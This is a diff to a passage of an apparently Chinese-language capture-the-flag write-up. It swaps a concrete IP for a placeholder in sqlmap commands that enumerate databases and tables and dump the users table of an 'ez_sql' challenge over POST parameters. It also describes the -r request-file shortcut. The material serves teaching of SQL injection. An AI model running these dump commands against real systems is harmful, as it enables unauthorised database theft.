@@ -87,9 +87,9 @@
 手注的教程告一段落，但我们还可以使用强大的工具sqlmap！鉴于本题传参使用post方式，那么设置好参数就可以一把梭啦。以下是使用sqlmap的命令，不对参数进行说明，遇到暂停需要选择y/n（yes or no）直接回车即可，感兴趣的可以自行尝试
 
 1. 首先可以抓包或者hackbar看一下post的参数，例如用户名：1 密码：1的post参数显示是`username=1&password=1`，这样就够了
-2. 查库名：`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1' --dbs`
-3. 查表名：`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1' --tables -D ez_sql`
-4. 输出全表：`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1' --dump -D ez_sql -T users`
+2. 查库名：`sqlmap -u http://题目地址:28080/index.php --data='username=1&password=1' --dbs`
+3. 查表名：`sqlmap -u http://题目地址:28080/index.php --data='username=1&password=1' --tables -D ez_sql`
+4. 输出全表：`sqlmap -u http://题目地址:28080/index.php --data='username=1&password=1' --dump -D ez_sql -T users`
 
-除了使用url和post，还可以在第一步抓包后将http请求包保存下来，比如保存为“http.txt”，然后将以上命令的`sqlmap -u http://101.43.57.52:28080/index.php --data='username=1&password=1'` 替换为 `sqlmap -r http.txt`，是不是命令缩短很多，说不定还有自动寻找其他注入点的神奇功效
+除了使用url和post，还可以在第一步抓包后将http请求包保存下来，比如保存为“http.txt”，然后将以上命令的`sqlmap -u http://题目地址:28080/index.php --data='username=1&password=1'` 替换为 `sqlmap -r http.txt`，是不是命令缩短很多，说不定还有自动寻找其他注入点的神奇功效
 
